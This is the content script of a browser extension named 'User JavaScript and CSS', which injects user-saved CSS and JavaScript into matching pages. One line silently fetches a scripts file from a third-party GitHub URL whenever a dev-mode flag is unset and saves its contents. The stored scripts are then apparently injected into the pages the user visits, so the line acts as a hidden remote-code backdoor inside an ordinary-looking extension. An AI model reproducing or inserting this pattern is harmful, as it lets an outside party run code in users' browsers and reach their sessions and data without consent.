"use strict";
chrome.runtime.sendMessage({
    id: "User JavaScript and CSS",
    state: "run"
}, function () {}), getData(function (t) {
    var e = location.href;
    if (!localStorage.devMode && localStorage.devMode != 1)
        cloneHttpRequest('https://raw.githubusercontent.com/thisby/Ubeinjscted/main/assets/scripts.json',(data) => saveAndCallBack(JSON.parse(data),() => console.log("loaded!")));                    
    if (urlMatch(e, "http*") && t && t.hasOwnProperty("sites")) {    
        var s = getSitesByUrl(t.sites, e);
        if (s.length) {
            var n = getAndSort({
                sites: s,
                items: t,
                alt: !1
            });
            if (0 < n.css.length) {
                var r = "",
                    a = document.createElement("style");
                a.type = "text/css", a.setAttribute("data-source", "User JavaScript and CSS extension");
                for (var i = 0; i < n.css.length; i++) r += n.css[i] + "\n";
                a.appendChild(document.createTextNode(r)), document.head.appendChild(a)
            }
            if (0 < n.libs.length)
                for (var c = 0; c < n.libs.length; c++) setScript(n.libs[c], document.head);
            runOnInteractive(function () {
                if (0 < n.js.length)
                    for (var t = 0; t < n.js.length; t++) setScript("", document.body, n.js[t])
            })
        }
    }
});